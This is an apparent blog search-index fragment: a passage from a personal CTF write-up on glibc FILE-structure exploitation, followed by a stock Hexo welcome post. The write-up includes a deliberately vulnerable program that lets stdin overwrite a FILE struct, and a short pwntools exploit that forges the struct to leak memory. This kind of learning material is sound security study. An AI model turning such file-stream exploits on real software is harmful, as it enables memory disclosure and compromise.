(f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */  if (_IO_do_flush (f) == EOF) ##     return EOF;\n\nHere we will also got a 0 and goto upper-level function\n\n\nJust use step we will step into the function below\n\n\n_IO_default_xsputn (FILE *f, const void *data, size_t n)&#123;  const char *s = (char *) data;  size_t more = n;  if (more &lt;= 0)    return 0;  for (;;)    &#123;      /* Space available. */      if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)\t&#123;\t  size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;\t  if (count &gt; more)\t    count = more;\t  if (count &gt; 20)\t    &#123;\t      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);\t      s += count;\t    &#125;\t  else if (count)\t    &#123;\t      char *p = f-&gt;_IO_write_ptr;\t      ssize_t i;\t      for (i = count; --i &gt;= 0; )\t\t*p++ = *s++;\t      f-&gt;_IO_write_ptr = p;\t    &#125;\t  more -= count;\t&#125;      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)\tbreak;      more--;    &#125;  return n - more;&#125;libc_hidden_def (_IO_default_xsputn)\n\n\n\nAfter we go there\n\n\nWe can see the write ptr has add the 0x20 due to the f-&gt;_IO_write_ptr &#x3D; __mempcpy (f-&gt;_IO_write_ptr, s, count);\nif we use the program below we could see something more!!!\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    FILE* fp = fopen(&quot;./flag&quot;,&quot;ab&quot;);    char *ptr = malloc(0x20);    strcpy(ptr, &quot;flag&#123;123456789&#125;&quot;);    fwrite(ptr, 1, 0x20, fp);    return 0;&#125; \n\n\n\n\n\nThe same as our read let the data on our ptr first, then to write or read \n(Before we go continue we check our flag find out it was cleared????WHY\nbecause we use w as its arg, so as the func open finished all the flag will be cleared)\nPART2Now we back to the vedio.\nRob make this program.\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char secret_message[] = &quot;SECRET_FLAG_VALUE&quot;;int main(int argc, char **argv) &#123;    // leak secret_message    printf(&quot;secret_message is located at: %p\\n&quot;, &amp;secret_message);    // Open a file    FILE *file_pointer = fopen(&quot;/dev/null&quot;, &quot;w&quot;);    // Overwrite the file struct from stdin    read(0, file_pointer, 0x100);    // Call fwrite on the file    char buf[256];    puts(&quot;Calling fwrite!&quot;);    fwrite(buf, 1, 40, file_pointer);    return 0;&#125;\n\nWe also make the exp for this problem\n\nfrom pwn import *context.arch = &#x27;amd64&#x27;p = process(&#x27;./a.out&#x27;)p.recvuntil(b&#x27;at: &#x27;)win_var_leak = int(p.recvline()[:-1],16) print(hex(win_var_leak))fp = FileStructure()payload = fp.write(win_var_leak, 20)print(fp)p.send(payload)p.interactive()\n\nAs we can see \n\n\n\nLet’s have some check\nIn the func of  _IO_new_file_overflow, we could see one thing\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) &#x3D;&#x3D; 0 || f-&gt;_IO_write_base &#x3D;&#x3D; NULL), we will go straight to the place \nif (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\nwe go to this func \n\nint_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123;  return (to_do == 0    || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;   libc_hidden_ver (_IO_new_do_write, _IO_do_write)\n\nstatic_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123;  _IO_size_t count;  ...  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      _IO_off64_t new_pos  = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)  return 0;      fp-&gt;_offset = new_pos;    &#125;  count = _IO_SYSWRITE (fp, data, to_do);  ...  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0           &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))           ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);  return count;&#125;\n\nAt count = _IO_SYSWRITE (fp, data, to_do); here we see data was our win addr and fileno: 0x1, This time we will put on our screen\n\nThat is soooooooo beautiful.\nFINALLYHi bro if you see here, wooooowwww, you made it. And i also made it. I really like pwn and i trust myself to be a pwn master\n\nHI IF YOU LIKE THIS ARTICLE. GIVE ME A STAR!!! THANK YOU~~ SEE YOU NEXT TIME!!!\n\nLINKhttps://wiki.wgpsec.org/knowledge/ctf/iofile.html\nhttps://elixir.bootlin.com/glibc/glibc-2.35/source/libio\nhttps://ciphersaw.me/ctf-wiki/pwn/linux/io_file&#x2F;introduction&#x2F;\nhttps://www.cubeyond.net/\n"},{"title":"Hello World","url":"/2025/12/26/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"}]